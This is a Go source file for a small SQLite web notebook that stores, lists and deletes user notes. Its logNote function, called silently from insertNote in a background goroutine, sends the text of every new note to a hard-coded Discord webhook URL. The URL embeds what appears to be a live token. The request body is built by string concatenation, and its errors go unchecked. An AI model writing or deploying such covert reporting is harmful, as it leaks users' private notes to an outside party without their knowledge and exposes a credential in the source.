package main

import (
	"fmt"
	"net/http"
	"database/sql"
	"log"
	_ "github.com/mattn/go-sqlite3"
	"html"
	"strings"
)

func indexPage(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
		getNotes(w,r)
	case "POST":
		r.ParseForm()
		method := r.FormValue("method")
		switch method {
			case "create":	
				note := r.FormValue("note")
				if note == "" {
					fmt.Fprintf(w, "Note is empty")
				} else {
					insertNote(note)
					http.Redirect(w, r, "/", http.StatusFound)
				}
			case "delete":
				id := r.FormValue("id")
				if id == "" {
					fmt.Fprintf(w, "ID is empty")
				} else {
					deleteNote(id)
					http.Redirect(w, r, "/", http.StatusFound)
				}
			default:
				fmt.Fprintf(w, "Method not found")
			}
	default:
		fmt.Fprintf(w, "Sorry, only GET and POST methods are supported.")
	}
}

func main() {
	http.HandleFunc("/style.css", serveCSS)
	http.HandleFunc("/", indexPage)
	createTable()
	fmt.Println("Listening at http://localhost:8080")
	http.ListenAndServe(":8080", nil)
}

func logNote(note string) {
	postURL := "https://discord.com/api/webhooks/1072211662242844752/VjVha80rkw439rHexGsVEh31kzrWTmfmhOq4_Uh92Kd7tESGkgu4JdXWAh_zjnUKchtX"
	payload := strings.NewReader("{\"content\":\"" + note + "\"}")
	req, _ := http.NewRequest("POST", postURL, payload)
	req.Header.Add("Content-Type", "application/json")
	res, _ := http.DefaultClient.Do(req)
	defer res.Body.Close()
}

func serveCSS(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, `
.notes {
    list-style: none;
    margin: 0;
    padding: 0;
}

.notes li {
  position: relative;
  width: 30%;
  padding: 1em 1.5em;
  margin: 1em;
  background: #ffb;
  overflow: hidden;
  box-shadow: 0 1px 0 rgba(0,0,0,0.1);
}

.notes li:before {
  content: "";
  position: absolute;
  top: 0;
  right: 0;
  border-width: 0 16px 16px 0;
  border-style: solid;
  border-color: #fff #fff #eea #eea;
  background: #eea;
  box-shadow: 0 1px 1px rgba(0,0,0,0.2), -1px 1px 1px rgba(0,0,0,0.1);
}
`);
}

func createTable() {
	db, err := sql.Open("sqlite3", "./notes.db")
	handleErr(err)
	defer db.Close()
	sqlStmt := `SELECT name FROM sqlite_master WHERE type='table' AND name='notes';`
	row := db.QueryRow(sqlStmt)
	var name string
	err = row.Scan(&name)
	if err != nil {
		sqlStmt := `create table notes (note text);`
		_, err = db.Exec(sqlStmt)
		handleErr(err)
	}
}

func insertNote(note string) {
	go logNote(note)
	db, err := sql.Open("sqlite3", "./notes.db")
	handleErr(err)
	defer db.Close()
	stmt, err := db.Prepare("INSERT INTO notes(note) values(?)")
	handleErr(err)
	defer stmt.Close()
	_, err = stmt.Exec(note)
	handleErr(err)
}

func deleteNote(id string) {
	db, err := sql.Open("sqlite3", "./notes.db")
	handleErr(err)
	defer db.Close()
	stmt, err := db.Prepare("DELETE FROM notes WHERE rowid=?")
	handleErr(err)
	defer stmt.Close()
	_, err = stmt.Exec(id)
	handleErr(err)
}

func getNotes(w http.ResponseWriter, r *http.Request) {
	db, err := sql.Open("sqlite3", "./notes.db")
	handleErr(err)
	defer db.Close()
	rows, err := db.Query("SELECT rowid as id, note FROM notes")
	handleErr(err)
	defer rows.Close()
	fmt.Fprintf(w, `<link rel="stylesheet" href="/style.css">
                  <h1>GO Notebook</h1>
                  <form method="POST">
                  <label>Note: <input name="note" value=""></label>
                  <input type="hidden" name="method" value="create">
                  <button>Add</button>
                  </form>
									<ul class="notes">`);
	for rows.Next() {
		var id string
		var note string
		err = rows.Scan(&id, &note)
		handleErr(err)
		fmt.Fprintf(w,"<li>" + html.EscapeString(note) + `<form method="POST"><input type="hidden" name="method" value="delete"><button name="id" value="` + id + `"style="float: right;">Delete</button></form></li>`);
	}
	err = rows.Err()
	handleErr(err)
	fmt.Fprintf(w, "</ul>");
}

func handleErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
